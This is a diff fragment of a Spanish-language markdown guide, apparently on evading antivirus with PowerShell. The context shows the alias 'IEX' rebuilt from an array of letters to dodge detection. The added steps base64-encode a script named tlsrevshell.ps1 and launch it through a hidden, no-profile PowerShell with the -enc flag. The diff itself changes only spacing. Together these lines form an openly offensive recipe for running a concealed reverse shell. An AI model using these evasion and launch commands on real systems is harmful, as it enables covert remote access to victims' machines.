@@ -33,11 +33,15 @@ Aquí otro método que he visto, pero la idea es utilizar el tuyo propio:
 [array]$shurmano = "I","n","t","E","r","n","e","X" ;
 set-alias new-exercise $($shurmano | foreach { if ($_ -cmatch '[A-Z]' -eq $true) {$x += $_}}; $x)
 ```
+
 **3.- Pasar el script de powershell a base64**
+
 ```
 cat tlsrevshell.ps1 | iconv -f UTF8 -t UTF16LE | base64 -w 0
 ```
+
 **4.- Ejecutarlo desde consola PS **
+
 ```
 powershell -noP -sta -w 1 -enc ENC64SCRIPT
 ```
